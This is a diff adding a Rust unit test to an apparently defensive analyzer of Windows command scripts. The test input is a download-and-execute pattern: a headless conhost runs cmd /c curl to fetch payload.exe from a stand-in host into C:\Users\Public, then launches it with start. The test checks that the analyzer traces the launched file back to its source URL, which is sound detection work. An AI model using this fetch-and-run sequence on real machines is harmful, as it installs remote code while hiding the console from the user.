@@ -3445,6 +3445,27 @@ start "" "C:\Users\Public\second.exe""#,
     }
 
     #[test]
+    fn start_local_target_resolves_prior_conhost_cmd_c_download_source_url() {
+        let report = analyze(
+            br#"conhost.exe --headless cmd.exe /c curl.exe -L https://conhost-cmd-start.example/payload.exe -o C:\Users\Public\payload.exe
+start "" "C:\Users\Public\payload.exe""#,
+            &AnalyzeConfig::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == r#"start "C:\Users\Public\payload.exe""#
+                            && url == "https://conhost-cmd-start.example/payload.exe"
+                )
+            }),
+            "start local target did not resolve prior conhost cmd /c download source: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn unknown_redirected_command_does_not_emit_unresolved_pipeline() {
         let script = b"GIFTS WITH DISCOUNTS >nul 2>&1 LIMITED OFFER\r\n";
         let report = analyze(script, &AnalyzeConfig::default());
